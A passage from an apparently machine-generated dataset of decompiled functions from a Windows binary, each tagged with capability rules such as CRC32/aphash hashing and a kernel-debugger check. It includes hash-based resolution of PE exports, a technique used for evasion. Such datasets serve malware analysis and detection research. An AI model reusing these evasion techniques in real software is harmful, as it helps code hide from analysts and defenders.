         else {\n                        var_14h = var_14h >> 1;\n                    }\n                } while (var_20h != 0);\n                if (var_24h != 0) {\n                    if (var_2ch == 0) {\n                        fcn.00403e49((&var_234h)[uVar1], in_EAX);\n                        fcn.00403f7c(var_18h, var_4h, var_8h, arg_10h, in_EAX);\n                    }\n                    else {\n                        fcn.004043a4();\n                    }\n                }\n            }\n            fcn.004043a4();\n            if (var_ch != 0) {\n                fcn.004043b8();\n            }\n            fcn.00403bed();\n            if (var_28h != 0) {\n                fcn.004043b8();\n            }\n            fcn.00403bed();\n            if (var_4h != 0) {\n                fcn.004043b8();\n            }\n            fcn.00403bed();\n            if (var_18h != 0) {\n                fcn.004043b8();\n            }\n            fcn.00403bed();\n            if (1 < var_34h) {\n                piVar7 = &var_230h;\n                iVar5 = var_34h - 1;\n                do {\n                    if (*piVar7 != 0) {\n                        fcn.004043b8();\n                    }\n                    fcn.00403bed();\n                    piVar7 = piVar7 + 1;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1901
    },
    "0040698c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.0040698c(int16_t *param_1, uint32_t param_2, uint8_t param_3, code *param_4)\n\n{\n    int16_t *piVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint32_t uVar7;\n    uchar auStack136 [128];\n    int16_t *piStack8;\n    \n    piVar1 = param_1;\n    if (param_1 == NULL) {\n        return 0;\n    }\n    if (*param_1 != 0x5a4d) {\n        return 0;\n    }\n    piStack8 = *(param_1 + 0x1e) + 4 + param_1;\n    if (*piStack8 != 0x14c) {\n        return 0;\n    }\n    if (*(piStack8 + 0x3a) == 0) {\n        return 0;\n    }\n    uVar7 = *(piStack8 + 0x3a) + param_1;\n    if (param_2 >> 0x10 == 0) {\n        uVar2 = (param_2 & 0xffff) - *(uVar7 + 0x10);\ncode_r0x00406a5f:\n        if (uVar2 != 0xffffffff) {\n            uVar2 = *(*(uVar7 + 0x1c) + uVar2 * 4 + piVar1) + piVar1;\n            goto code_r0x00406a3b;\n        }\n    }\n    else {\n        if ((param_3 & 1) == 0) {\n            uVar3 = fcn.00406949();\n            param_1 = fcn.0040681d(extraout_ECX, uVar3);\n        }\n        else {\n            param_1 = param_2;\n        }\n        uVar2 = 0;\n        if (*(uVar7 + 0x18) != 0) {\n            do {\n                uVar3 = fcn.00406949();\n                uVar4 = fcn.0040681d(extraout_ECX_00, uVar3);\n                if (param_1 == uVar4) {\n                    uVar2 = *(*(uVar7 + 0x24) + uVar2 * 2 + piVar1);\n                    goto code_r0x00406a5f;\n                }\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < *(uVar7 + 0x18));\n        }\n    }\n    uVar2 = 0;\ncode_r0x00406a3b:\n    if ((uVar7 <= uVar2) && (uVar2 < *(piStack8 + 0x3c) + uVar7)) {\n        if (param_4 == NULL) {\n            uVar2 = 0;\n        }\n        else {\n            fcn.00406959(auStack136);\n            uVar2 = 0;\n            puVar5 = fcn.00406972();\n            if (puVar5 != NULL) {\n                *puVar5 = 0;\n                iVar6 = (*param_4)(auStack136, 0, 0);\n                if (iVar6 != 0) {\n                    uVar2 = fcn.0040698c(iVar6, puVar5 + 1, 0, param_4);\n                }\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 798
    },
    "00406e0a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406e0a(char param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    if ('d' < param_1) {\n        if (param_1 < 'q') {\n            if (param_1 != 'p') {\n                if ('d' < param_1) {\n                    if (param_1 < 'h') {\ncode_r0x00406ef7:\n                        *in_EAX = 10;\n                        goto code_r0x00406f3b;\n                    }\n                    if (param_1 == 'i') goto code_r0x00406ee1;\n                    if (param_1 == 'o') {\n                        if ((in_EAX[1] & 0x13U) == 0) {\n                            in_EAX[1] = in_EAX[1] | 1;\n                        }\n                        *in_EAX = 8;\n                        goto code_r0x00406f3b;\n                    }\n                }\n                goto code_r0x00406f11;\n            }\ncode_r0x00406e41:\n            in_EAX[1] = in_EAX[1] | 0x20;\n            in_EAX[2] = 8;\n        }\n        else {\n            if (param_1 == 's') {\n                iVar1 = ((*(in_EAX + 1) & 5) != 0) + 3;\n                goto code_r0x00406f39;\n            }\n            if (param_1 == 'u') {\n                if ((in_EAX[1] & 0x13U) == 0) {\n                    in_EAX[1] = in_EAX[1] | 1;\n                }\n                *in_EAX = 6;\n                goto code_r0x00406f3b;\n            }\n            if (param_1 != 'x') goto code_r0x00406f11;\n        }\ncode_r0x00406e4c:\n        if ((in_EAX[1] & 0x33U) == 0) {\n            in_EAX[1] = in_EAX[1] | 1;\n        }\n        *in_EAX = 7;\n        goto code_r0x00406f3b;\n    }\n    if (param_1 == 'd') {\ncode_r0x00406ee1:\n        if ((in_EAX[1] & 0x13U) == 0) {\n            in_EAX[1] = in_EAX[1] | 1;\n        }\n        *in_EAX = 5;\n        goto code_r0x00406f3b;\n    }\n    if (param_1 < 'T') {\n        if (param_1 == 'S') {\n            iVar1 = 4 - ((in_EAX[1] & 6U) != 0);\n        }\n        else {\n            if (param_1 != 'C') {\n                if ((param_1 == 'E') || (param_1 == 'G')) goto code_r0x00406ef7;\n                if (param_1 == 'P') goto code_r0x00406e41;\n                goto code_r0x00406f11;\n            }\n            bVar2 = (*(in_EAX + 1) & 2) == 0;\ncode_r0x00406e6f:\n            iVar1 = bVar2 + 1;\n        }\ncode_r0x00406f39:\n        *in_EAX = iVar1;\n    }\n    else {\n        if (param_1 == 'X') goto code_r0x00406e4c;\n        if (param_1 == '[') {\n            *in_EAX = 9;\n            goto code_r0x00406f3b;\n        }\n        if (param_1 == 'c') {\n            bVar2 = (*(in_EAX + 1) & 1) != 0;\n            goto code_r0x00406e6f;\n        }\ncode_r0x00406f11:\n        *in_EAX = 0;\n    }\ncode_r0x00406f3b:\n    return *in_EAX;\n}\n",
        "token_count": 917
    },
    "00407122": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nint32_t __cdecl fcn.00407122(double *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    float fVar4;\n    int64_t iVar5;\n    uint8_t uVar6;\n    int32_t *in_EAX;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint8_t *in_ECX;\n    uint8_t *puVar9;\n    bool bVar10;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    float10 extraout_ST0_01;\n    float10 extraout_ST1;\n    float10 extraout_ST1_00;\n    float10 fVar11;\n    int64_t iVar12;\n    float var_18h;\n    float var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    uVar6 = *in_ECX;\n    var_8h = 0;\n    if (uVar6 == 0) {\n        return 0;\n    }\n    do {\n        iVar7 = (*_sym.imp.ntdll.dll_isspace)(uVar6);\n        if (iVar7 == 0) break;\n        in_ECX = in_ECX + 1;\n        uVar6 = *in_ECX;\n        var_8h = var_8h + 1;\n    } while (uVar6 != 0);\n    uVar6 = *in_ECX;\n    if (uVar6 == 0) {\n        return var_8h;\n    }\n    var_ch = 0;\n    // switch table (10 cases) at 0x407612\n    switch(*in_EAX) {\n    case 1:\n        if (arg_8h != NULL) {\n            *arg_8h = uVar6;\n        }\n        goto code_r0x00407180;\n    case 2:\n        if (arg_8h != NULL) {\n            *arg_8h = uVar6;\n        }\ncode_r0x00407180:\n        var_8h = 1;\n        goto code_r0x004075fe;\n    case 3:\n        var_ch = 0;\n        iVar7 = in_EAX[2];\n        while (((iVar7 != 0 && (*in_ECX != 0)) && (iVar7 = (*_sym.imp.ntdll.dll_isspace)(*in_ECX),  iVar7 == 0))) {\n            if (arg_8h != NULL) {\n                *(var_ch + arg_8h) = *in_ECX;\n            }\n            if (0 < in_EAX[2]) {\n                in_EAX[2] = in_EAX[2] + -1;\n            }\n            var_ch = var_ch + 1;\n            in_ECX = in_ECX + 1;\n            iVar7 = in_EAX[2];\n        }\n        if (arg_8h != NULL) {\n            *(var_ch + arg_8h) = 0;\n        }\n        goto code_r0x004071e2;\n    case 4:\n        var_ch = 0;\n        iVar7 = in_EAX[2];\n        while (((iVar7 != 0 && (*in_ECX != 0)) && (iVar7 = (*_sym.imp.ntdll.dll_isspace)(*in_ECX),  iVar7 == 0))) {\n            if (arg_8h != NULL) {\n                fcn.00407890(in_ECX, 1, arg_8h + var_ch * 2);\n            }\n            if (0 < in_EAX[2]) {\n                in_EAX[2] = in_EAX[2] + -1;\n            }\n            var_ch = var_ch + 1;\n            in_ECX = in_ECX + 1;\n            iVar7 = in_EAX[2];\n        }\n        if (arg_8h != NULL) {\n            *(arg_8h + var_ch * 2) = 0;\n        }\ncode_r0x004071e2:\n        var_8h = var_8h + var_ch;\ncode_r0x004071e7:\n        if (var_ch == 0) {\n            return var_8h;\n        }\n        goto code_r0x004075fe;\n    case 5:\n    case 6:\n        break;\n    case 7:\n        var_ch = 0x10;\n        break;\n    case 8:\n        var_ch = 8;\n        break;\n    case 9:\n        if (in_EAX[4] == 0) {\n            return var_8h;\n        }\n        cVar1 = *(in_EAX + 3);\n        var_ch = 0;\n        iVar7 = in_EAX[2];\n        while (((iVar7 != 0 && (uVar6 = *in_ECX,  uVar6 != 0)) &&\n               (in_ECX = in_ECX + 1,  -(cVar1 != '\\0') != -((1 << (uVar6 & 7) & *((uVar6 >> 3) + in_EAX[4])) != 0)))) {\n            var_8h = var_8h + 1;\n            *arg_8h = uVar6;\n            if (0 < in_EAX[2]) {\n                in_EAX[2] = in_EAX[2] + -1;\n            }\n            var_ch = var_ch + 1;\n            iVar7 = in_EAX[2];\n            arg_8h = arg_8h + 1;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = 0;\n        }\n        fcn.00406d25();\n        goto code_r0x004071e7;\n    case 10:\n        fVar11 = 0;\n        if ((uVar6 == 0x2d) || (uVar6 == 0x2b)) {\n            in_ECX = in_ECX + 1;\n            var_8h = var_8h + 1;\n            if (0 < in_EAX[2]) {\n                in_EAX[2] = in_EAX[2] + -1;\n            }\n        }\n        if (*in_ECX != 0x2e) {\n            iVar7 = in_EAX[2];\n            while (((iVar7 != 0 && (uVar6 = *in_ECX,  uVar6 != 0)) &&\n                   (iVar7 = fcn.004070d7(),  fVar11 = extraout_ST1,  iVar7 != 0))) {\n                in_ECX = in_ECX + 1;\n                var_8h = var_8h + -1;\n                fVar11 = extraout_ST1 * extraout_ST0 + uVar6 + -0x30;\n                if (0 < in_EAX[2]) {\n                    in_EAX[2] = in_EAX[2] + -1;\n                }\n                iVar7 = in_EAX[2];\n            }\n        }\n        iVar7 = in_EAX[2];\n        if ((iVar7 != 0) && (*in_ECX == 0x2e)) {\n            while( true ) {\n                in_ECX = in_ECX + 1;\n                var_8h = var_8h + -1;\n                if (0 < iVar7) {\n                    in_EAX[2] = iVar7 + -1;\n                }\n                if (((in_EAX[2] == 0) || (uVar6 = *in_ECX,  uVar6 == 0)) || (iVar7 = fcn.004070d7(),  iVar7 == 0))\n                break;\n                iVar7 = in_EAX[2];\n                fVar11 = (uVar6 + -0x30) * (extraout_ST0_00 / extraout_ST1_00) + fVar11;\n            }\n        }\n        iVar7 = in_EAX[2];\n        if ((iVar7 != 0) && ((*in_ECX == 0x65 || (*in_ECX == 0x45)))) {\n            var_ch = 0;\n            puVar9 = in_ECX + 1;\n            bVar10 = false;\n            if (0 < iVar7) {\n                in_EAX[2] = iVar7 + -1;\n            }\n            iVar7 = in_EAX[2];\n            iVar8 = var_8h + -1;\n            if ((iVar7 != 0) && ((uVar6 = *puVar9,  uVar6 == 0x2d || (uVar6 == 0x2b)))) {\n                bVar10 = uVar6 == 0x2d;\n                puVar9 = in_ECX + 2;\n                iVar8 = var_8h + -2;\n                if (0 < iVar7) {\n                    in_EAX[2] = iVar7 + -1;\n                }\n            }\n            while (((var_8h = iVar8,  in_EAX[2] != 0 && (uVar6 = *puVar9,  uVar6 != 0)) &&\n                   (iVar7 = fcn.004070d7(),  fVar11 = extraout_ST0_01,  iVar7 != 0))) {\n                var_ch = var_ch * 10 + -0x30 + uVar6;\n                puVar9 = puVar9 + 1;\n                iVar8 = var_8h + -1;\n                if (0 < in_EAX[2]) {\n                    in_EAX[2] = in_EAX[2] + -1;\n                }\n            }\n            fVar4 = *0x4128a4;\n            if (bVar10) {\n                fVar4 = *0x4128a8;\n            }\n            for (; var_ch != 0; var_ch = var_ch / 2) {\n                if ((var_ch & 1) != 0) {\n                    fVar11 = fVar11 * fVar4;\n                }\n                fVar4 = fVar4 * fVar4;\n            }\n        }\n        if (arg_8h != NULL) {\n            if (((in_EAX[1] & 0x10U) == 0) && ((in_EAX[1] & 1U) == 0)) {\n                *arg_8h = fVar11;\n            }\n            else {\n                *arg_8h = fVar11;\n            }\n        }\n        goto code_r0x004075fe;\n    default:\n        return var_8h;\n    }\n    iVar12 = 0;\n    bVar10 = false;\n    bVar3 = true;\n    if ((uVar6 == 0x2d) || (uVar6 == 0x2b)) {\n        bVar10 = uVar6 == 0x2d;\n        in_ECX = in_ECX + 1;\n        var_8h = var_8h + 1;\n        if (0 < in_EAX[2]) {\n            in_EAX[2] = in_EAX[2] + -1;\n        }\n    }\n    iVar7 = in_EAX[2];\n    if ((iVar7 != 0) && (*in_ECX == 0x30)) {\n        in_ECX = in_ECX + 1;\n        var_8h = var_8h + 1;\n        if (0 < iVar7) {\n            in_EAX[2] = iVar7 + -1;\n        }\n        iVar7 = in_EAX[2];\n        if ((iVar7 != 0) && ((*in_ECX == 0x78 || (*in_ECX == 0x58)))) {\n            if (var_ch == 0) {\n                var_ch = 0x10;\n            }\n            if (var_ch == 0x10) goto code_r0x004072e9;\n            bVar3 = false;\n        }\n    }\n    while ((iVar7 = var_8h,  in_EAX[2] != 0 && (*in_ECX == 0x30))) {\n        iVar7 = in_EAX[2];\ncode_r0x004072e9:\n        in_ECX = in_ECX + 1;\n        var_8h = var_8h + 1;\n        if (0 < iVar7) {\n            in_EAX[2] = iVar7 + -1;\n        }\n    }\n    iVar5 = 0;\n    if (in_EAX[2] != 0) {\n        do {\n            iVar5 = iVar12;\n            if ((in_ECX[var_8h - iVar7] == 0) || (iVar8 = fcn.004070d7(),  iVar8 == -1)) break;\n            iVar12 = sub.ntdll.dll__allmul();\n            iVar12 = iVar12 + iVar8;\n            var_8h = var_8h + 1;\n            if (0 < in_EAX[2]) {\n                in_EAX[2] = in_EAX[2] + -1;\n            }\n            iVar5 = iVar12;\n        } while (in_EAX[2] != 0);\n    }\n    var_14h = iVar5 >> 0x20;\n    var_18h = iVar5;\n    if (!bVar3) {\n        return var_8h;\n    }\n    if (arg_8h == NULL) goto code_r0x004075fe;\n    if ((bVar10) && (*in_EAX == 5)) {\n        iVar5 = CONCAT44(-(var_14h + (var_18h != 0.0)), -var_18h);\n    }\n    var_14h = iVar5 >> 0x20;\n    var_18h = iVar5;\n    uVar2 = in_EAX[1];\n    if ((uVar2 & 8) == 0) {\n        if ((uVar2 & 2) != 0) {\n            *arg_8h = iVar5;\n            goto code_r0x004075fe;\n        }\n        if (((uVar2 & 1) == 0) && ((uVar2 & 0x20) == 0)) {\n            if ((uVar2 & 0x10) != 0) {\n                *arg_8h = var_18h;\n                *(arg_8h + 4) = var_14h;\n            }\n            goto code_r0x004075fe;\n        }\n    }\n    *arg_8h = var_18h;\ncode_r0x004075fe:\n    *arg_ch = 1;\n    return var_8h;\n}\n",
        "token_count": 3222
    },
    "00408048": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408048(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    uVar2 = arg_8h;\n    if ((arg_8h & 1) != 0) {\n        uVar1 = fcn.00407c34(0x412060, 0x1a, 0x387abaad);\n        uVar2 = fcn.00407f12(uVar1);\n    }\n    if ((arg_8h & 2) != 0) {\n        uVar1 = fcn.00407c34(0x41207c, 0x1a, 0x635b64d4);\n        uVar2 = fcn.00407f12(uVar1);\n    }\n    if ((arg_8h & 4) != 0) {\n        uVar1 = fcn.00407c34(0x412098, 10, 0xc59e3d81);\n        uVar2 = fcn.00407f12(uVar1);\n    }\n    if ((arg_8h & 8) != 0) {\n        uVar1 = fcn.00407c34(0x4120a4, 1, 0x91bb45dc);\n        uVar2 = fcn.00407f12(uVar1);\n    }\n    if ((arg_8h & 0x10) != 0) {\n        uVar1 = fcn.00407c34(0x4120a8, 1, 0x12bfd6fb);\n        uVar2 = fcn.00407f12(uVar1);\n    }\n    if ((arg_8h & 0x20) != 0) {\n        uVar1 = fcn.00407c34(0x4120ac, 1, 0x57f832ac);\n        uVar2 = fcn.00407f12(uVar1);\n    }\n    if ((arg_8h & 0x40) != 0) {\n        uVar1 = fcn.00407c34(0x4120b0, 0xb, 0xb8f3f5f8);\n        uVar2 = fcn.00407f12(uVar1);\n    }\n    if ((arg_8h & 0x80) != 0) {\n        uVar1 = fcn.00407c34(0x4120bc, 8, 0x6ddad3fa);\n        uVar2 = fcn.00407f12(uVar1);\n    }\n    *arg_ch = uVar2;\n    return 0;\n}\n",
        "token_count": 606
    },
    "00408604": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00408604(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint16_t *arg_10h;\n    uint32_t *puStack316;\n    int32_t iStack312;\n    uint32_t *puStack308;\n    uint32_t uStack304;\n    uint32_t uStack300;\n    uchar uStack292;\n    uchar uStack291;\n    uint32_t uStack288;\n    uint32_t uStack284;\n    uint32_t uStack280;\n    uint32_t uStack276;\n    uint32_t uStack272;\n    uint32_t uStack268;\n    char acStack264 [260];\n    \n    iStack312 = 0;\n    if (*arg_ch != 0) {\n        puStack316 = in_EAX + -4;\n        puStack308 = in_EAX + -8;\n        arg_10h = arg_8h;\n        do {\n            if (*arg_ch == 0x25) {\n                arg_ch = arg_ch + 1;\n                if (*arg_ch == 0x25) {\n                    if (arg_10h != NULL) {\n                        *arg_10h = 0x25;\n                        arg_10h = arg_10h + 1;\n                    }\n                    goto code_r0x0040864b;\n                }\n                iVar2 = fcn.00408493(arg_ch, &uStack284);\n                arg_ch = arg_ch + iVar2;\n                if (uStack284 == 1) {\n                    puStack308 = puStack308 + 1;\n                    puStack316 = puStack316 + 1;\n                    uStack304 = uStack304 & 0xffffff00 | *puStack316;\n                }\n                else if (uStack284 == 2) {\n                    puStack308 = puStack308 + 1;\n                    puStack316 = puStack316 + 1;\n                    uVar1 = *puStack316;\ncode_r0x00408702:\n                    uStack304 = uStack304 & 0xffff0000 | uVar1;\n                }\n                else if ((uStack284 == 3) || (uStack284 == 4)) {\n                    puStack308 = puStack308 + 1;\n                    puStack316 = puStack316 + 1;\n                    uStack304 = *puStack316;\n                }\n                else {\n                    if (3 < uStack284 - 5) {\n                        uVar1 = 0;\n                        goto code_r0x00408702;\n                    }\n                    if ((((uStack280 & 0x800) == 0) && ((uStack280 & 0x80) == 0)) && ((uStack280 & 0x100) != 0)) {\n                        uStack304 = puStack308[2];\n                        puStack316 = puStack316 + 2;\n                        uStack300 = puStack308[3];\n                        puStack308 = puStack308 + 2;\n                    }\n                    else {\n                        puStack308 = puStack308 + 1;\n                        puStack316 = puStack316 + 1;\n                        uStack304 = *puStack316;\n                        uStack300 = uStack304 >> 0x1f;\n                    }\n                }\n                uStack268 = fcn.004081e8(acStack264, uStack304, uStack300);\n                iStack312 = iStack312 + uStack268;\n                uStack288 = uStack280 & 1;\n                if ((uStack288 == 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 - uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (arg_10h != NULL) {\n                            *arg_10h = 0x20;\n                            arg_10h = arg_10h + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                uVar3 = 0;\n                iVar2 = iStack312;\n    // switch table (9 cases) at 0x408930\n                switch(uStack284) {\n                case 0:\n                    goto code_r0x00408901;\n                case 1:\n                    if (arg_10h != NULL) {\n                        uStack304._0_2_ = uStack304;\ncode_r0x004087c6:\n                        *arg_10h = uStack304;\n                        arg_10h = arg_10h + 1;\n                    }\n                    break;\n                case 2:\n                    if (arg_10h != NULL) {\n                        goto code_r0x004087c6;\n                    }\n                    break;\n                case 3:\n                    if ((arg_10h != NULL) && (uVar3 = 0,  uStack268 != 0)) {\n                        do {\n                            uStack292 = *(uVar3 + uStack304);\n                            uStack291 = 0;\n                            fcn.00407890(&uStack292, 1, arg_10h);\n                            arg_10h = arg_10h + 1;\n                            uVar3 = uVar3 + 1;\n                        } while (uVar3 < uStack268);\n                    }\n                    break;\n                case 4:\n                    if ((arg_10h != NULL) && (uVar3 = 0,  uStack268 != 0)) {\n                        do {\n                            *arg_10h = *(uStack304 + uVar3 * 2);\n                            arg_10h = arg_10h + 1;\n                            uVar3 = uVar3 + 1;\n                        } while (uVar3 < uStack268);\n                    }\n                    break;\n                case 7:\n                case 8:\n                    if (((uStack280 & 2) != 0) && (((uStack304 | uStack300) != 0 || ((uStack280 & 0x1000) != 0)))) {\n                        if (arg_10h != NULL) {\n                            *arg_10h = 0x30;\n                            arg_10h = arg_10h + 1;\n                        }\n                        iVar2 = iStack312 + 1;\n                        if (uStack284 == 7) {\n                            if (arg_10h != NULL) {\n                                *arg_10h = ~uStack280 & 0x20 | 0x58;\n                                arg_10h = arg_10h + 1;\n                            }\n                            iVar2 = iStack312 + 2;\n                        }\n                    }\n                case 5:\n                    iStack312 = iVar2;\n                    if ((arg_10h != NULL) && (acStack264[0] == '-')) {\n                        *arg_10h = 0x2d;\n                        arg_10h = arg_10h + 1;\n                        uVar3 = 1;\n                    }\n                case 6:\n                    if (uStack268 < uStack272) {\n                        iVar2 = uStack272 - uStack268;\n                        iStack312 = iStack312 + iVar2;\n                        do {\n                            if (arg_10h != NULL) {\n                                *arg_10h = 0x30;\n                                arg_10h = arg_10h + 1;\n                            }\n                            iVar2 = iVar2 + -1;\n                        } while (iVar2 != 0);\n                    }\n                    if (arg_10h != NULL) {\n                        for (; uVar3 < uStack268; uVar3 = uVar3 + 1) {\n                            *arg_10h = acStack264[uVar3];\n                            arg_10h = arg_10h + 1;\n                        }\n                    }\n                }\n                if ((uStack288 != 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 - uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (arg_10h != NULL) {\n                            *arg_10h = 0x20;\n                            arg_10h = arg_10h + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n            }\n            else {\n                if (arg_10h != NULL) {\n                    *arg_10h = *arg_ch;\n                    arg_10h = arg_10h + 1;\n                }\ncode_r0x0040864b:\n                arg_ch = arg_ch + 1;\n                iStack312 = iStack312 + 1;\n            }\ncode_r0x00408901:\n        } while (*arg_ch != 0);\n        if ((iStack312 != 0) && (arg_8h != NULL)) {\n            arg_8h[iStack312] = 0;\n        }\n    }\n    return iStack312;\n}\n",
        "token_count": 1938
    },
    "00408ac4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00408ac4(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    int32_t iStack312;\n    uint8_t *puStack308;\n    uint32_t *puStack304;\n    uint32_t *puStack300;\n    uint32_t uStack296;\n    uint32_t uStack292;\n    uint32_t uStack284;\n    uint32_t uStack280;\n    uint32_t uStack276;\n    uint32_t uStack272;\n    ushort uStack268;\n    ushort uStack266;\n    char acStack264 [260];\n    \n    iStack312 = 0;\n    puStack308 = arg_8h;\n    if (*arg_ch != 0) {\n        puStack300 = in_EAX + -4;\n        puStack304 = in_EAX + -8;\n        puVar5 = arg_8h;\n        do {\n            if (*arg_ch == 0x25) {\n                arg_ch = arg_ch + 1;\n                if (*arg_ch == 0x25) {\n                    if (puVar5 != NULL) {\n                        *puVar5 = 0x25;\n                        goto code_r0x00408b0b;\n                    }\n                    goto code_r0x00408b10;\n                }\n                iVar2 = fcn.00408974(arg_ch, &uStack284);\n                arg_ch = arg_ch + iVar2;\n                if (uStack284 == 1) {\n                    uStack296 = uStack296 & 0xffffff00 | *(puStack300 + 1);\ncode_r0x00408bf7:\n                    puStack304 = puStack304 + 1;\n                    puStack300 = puStack300 + 1;\n                }\n                else {\n                    if (uStack284 == 2) {\n                        uStack296 = uStack296 & 0xffff0000 | *(puStack300 + 1);\n                        goto code_r0x00408bf7;\n                    }\n                    if ((uStack284 == 3) || (uStack284 == 4)) {\n                        puStack304 = puStack304 + 1;\n                        puStack300 = puStack300 + 1;\n                        uStack296 = *puStack300;\n                    }\n                    else if (uStack284 - 5 < 4) {\n                        if ((((uStack280 & 0x800) == 0) && ((uStack280 & 0x80) == 0)) && ((uStack280 & 0x100) != 0)) {\n                            uStack296 = puStack304[2];\n                            uStack292 = puStack304[3];\n                            puStack300 = puStack300 + 2;\n                            puStack304 = puStack304 + 2;\n                        }\n                        else {\n                            puStack300 = puStack300 + 1;\n                            uStack296 = *puStack300;\n                            uStack292 = uStack296 >> 0x1f;\n                            puStack304 = puStack304 + 1;\n                        }\n                    }\n                    else {\n                        uStack296 = uStack296 & 0xffff0000;\n                    }\n                }\n                uVar3 = fcn.004081e8(acStack264, uStack296, uStack292);\n                iStack312 = iStack312 + uVar3;\n                uVar1 = uStack280 & 1;\n                if ((uVar1 == 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 - uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (puVar5 != NULL) {\n                            *puVar5 = 0x20;\n                            puVar5 = puVar5 + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                        puStack308 = puVar5;\n                    } while (iVar2 != 0);\n                }\n                uVar4 = 0;\n                iVar2 = iStack312;\n    // switch table (9 cases) at 0x408db0\n                switch(uStack284) {\n                case 0:\n                    goto code_r0x00408cea;\n                case 1:\n                case 2:\n                    if (puVar5 != NULL) {\n                        *puVar5 = uStack296;\n                        puVar5 = puVar5 + 1;\n                        puStack308 = puVar5;\n                    }\n                    break;\n                case 3:\n                    if ((puVar5 != NULL) && (uVar4 = 0,  uVar3 != 0)) {\n                        do {\n                            *puVar5 = *(uVar4 + uStack296);\n                            puVar5 = puVar5 + 1;\n                            uVar4 = uVar4 + 1;\n                            puStack308 = puVar5;\n                        } while (uVar4 < uVar3);\n                    }\n                    break;\n                case 4:\n                    if ((puVar5 != NULL) && (uVar4 = 0,  puVar5 = puStack308,  uVar3 != 0)) {\n                        do {\n                            uStack268 = *(uStack296 + uVar4 * 2);\n                            uStack266 = 0;\n                            fcn.004077b9(&uStack268, 1, puStack308);\n                            puVar5 = puStack308 + 1;\n                            uVar4 = uVar4 + 1;\n                            puStack308 = puVar5;\n                        } while (uVar4 < uVar3);\n                    }\n                    break;\n                case 7:\n                case 8:\n                    if (((uStack280 & 2) != 0) && (((uStack296 | uStack292) != 0 || ((uStack280 & 0x1000) != 0)))) {\n                        if (puVar5 != NULL) {\n                            *puVar5 = 0x30;\n                            puVar5 = puVar5 + 1;\n                            puStack308 = puVar5;\n                        }\n                        iVar2 = iStack312 + 1;\n                        if (uStack284 == 7) {\n                            if (puVar5 != NULL) {\n                                *puVar5 = ~uStack280 & 0x20 | 0x58;\n                                puVar5 = puVar5 + 1;\n                                puStack308 = puVar5;\n                            }\n                            iVar2 = iStack312 + 2;\n                        }\n                    }\n                case 5:\n                    iStack312 = iVar2;\n                    if ((puVar5 != NULL) && (acStack264[0] == '-')) {\n                        *puVar5 = 0x2d;\n                        puVar5 = puVar5 + 1;\n                        uVar4 = 1;\n                        puStack308 = puVar5;\n                    }\n                case 6:\n                    if (uVar3 < uStack272) {\n                        iVar2 = uStack272 - uVar3;\n                        iStack312 = iStack312 + iVar2;\n                        do {\n                            if (puVar5 != NULL) {\n                                *puVar5 = 0x30;\n                                puVar5 = puVar5 + 1;\n                            }\n                            iVar2 = iVar2 + -1;\n                            puStack308 = puVar5;\n                        } while (iVar2 != 0);\n                    }\n                    if ((puVar5 != NULL) && (uVar4 < uVar3)) {\n                        sub.ntdll.dll_memcpy(puVar5, acStack264 + uVar4, uVar3 - uVar4);\n                        puVar5 = puVar5 + (uVar3 - uVar4);\n                        puStack308 = puVar5;\n                    }\n                }\n                if ((uVar1 != 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 